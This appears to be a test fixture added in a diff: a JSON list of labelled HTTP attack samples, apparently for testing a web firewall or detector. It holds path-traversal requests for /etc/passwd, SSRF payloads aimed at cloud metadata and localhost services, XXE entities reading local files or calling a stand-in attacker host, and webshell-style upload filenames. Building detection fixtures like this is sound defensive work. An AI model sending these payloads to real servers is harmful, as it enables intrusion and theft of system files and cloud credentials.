@@ -1,0 +1,89 @@
+{
+  "samples": [
+    {
+      "id": "traversal-dotdot-passwd",
+      "category": "traversal",
+      "method": "GET",
+      "uri": "/download?file=../../../../etc/passwd",
+      "headers": { "User-Agent": "Mozilla/5.0" },
+      "args": { "file": ["../../../../etc/passwd"] }
+    },
+    {
+      "id": "traversal-php-filter",
+      "category": "traversal",
+      "method": "GET",
+      "uri": "/view?path=php://filter/convert.base64-encode/resource=index.php",
+      "headers": { "User-Agent": "Mozilla/5.0" },
+      "args": { "path": ["php://filter/convert.base64-encode/resource=index.php"] }
+    },
+    {
+      "id": "traversal-web-inf",
+      "category": "traversal",
+      "method": "GET",
+      "uri": "/download?file=WEB-INF/web.xml",
+      "headers": { "User-Agent": "Mozilla/5.0" },
+      "args": { "file": ["WEB-INF/web.xml"] }
+    },
+    {
+      "id": "ssrf-aws-metadata",
+      "category": "ssrf",
+      "method": "POST",
+      "uri": "/fetch",
+      "headers": { "Content-Type": "application/json", "User-Agent": "Mozilla/5.0" },
+      "args": { "url": ["http://169.254.169.254/latest/meta-data/"] },
+      "body": "{\"url\":\"http://169.254.169.254/latest/meta-data/\"}"
+    },
+    {
+      "id": "ssrf-localhost",
+      "category": "ssrf",
+      "method": "GET",
+      "uri": "/proxy?url=http://127.0.0.1:8080/admin",
+      "headers": { "User-Agent": "Mozilla/5.0" },
+      "args": { "url": ["http://127.0.0.1:8080/admin"] }
+    },
+    {
+      "id": "ssrf-gopher",
+      "category": "ssrf",
+      "method": "GET",
+      "uri": "/proxy?url=gopher://127.0.0.1:6379/_INFO",
+      "headers": { "User-Agent": "Mozilla/5.0" },
+      "args": { "url": ["gopher://127.0.0.1:6379/_INFO"] }
+    },
+    {
+      "id": "xxe-file-entity",
+      "category": "xxe",
+      "method": "POST",
+      "uri": "/api/xml",
+      "headers": { "Content-Type": "application/xml", "User-Agent": "Mozilla/5.0" },
+      "args": { "xml": ["<!DOCTYPE r [ <!ENTITY xxe SYSTEM \"file:///etc/passwd\"> ]><r>&xxe;</r>"] },
+      "body": "<!DOCTYPE r [ <!ENTITY xxe SYSTEM \"file:///etc/passwd\"> ]><r>&xxe;</r>"
+    },
+    {
+      "id": "xxe-http-entity",
+      "category": "xxe",
+      "method": "POST",
+      "uri": "/soap",
+      "headers": { "Content-Type": "application/xml", "User-Agent": "Mozilla/5.0" },
+      "args": { "xml": ["<!DOCTYPE r [ <!ENTITY e SYSTEM \"http://attacker.test/evil\"> ]><r>&e;</r>"] },
+      "body": "<!DOCTYPE r [ <!ENTITY e SYSTEM \"http://attacker.test/evil\"> ]><r>&e;</r>"
+    },
+    {
+      "id": "upload-php-double-extension",
+      "category": "upload",
+      "method": "POST",
+      "uri": "/upload",
+      "headers": { "Content-Type": "multipart/form-data; boundary=BOUNDARY", "User-Agent": "Mozilla/5.0" },
+      "args": { "file": ["avatar.jpg.php"], "content": ["webshell_eval_post indicator"] },
+      "body": "--BOUNDARY\r\nContent-Disposition: form-data; name=\"file\"; filename=\"avatar.jpg.php\"\r\nContent-Type: image/jpeg\r\n\r\nwebshell_eval_post indicator\r\n--BOUNDARY--"
+    },
+    {
+      "id": "upload-jsp-webshell",
+      "category": "upload",
+      "method": "POST",
+      "uri": "/upload",
+      "headers": { "Content-Type": "multipart/form-data; boundary=BOUNDARY", "User-Agent": "Mozilla/5.0" },
+      "args": { "file": ["shell.jsp"], "content": ["jsp_runtime_exec indicator"] },
+      "body": "filename=shell.jsp&content=jsp_runtime_exec indicator"
+    }
+  ]
+}
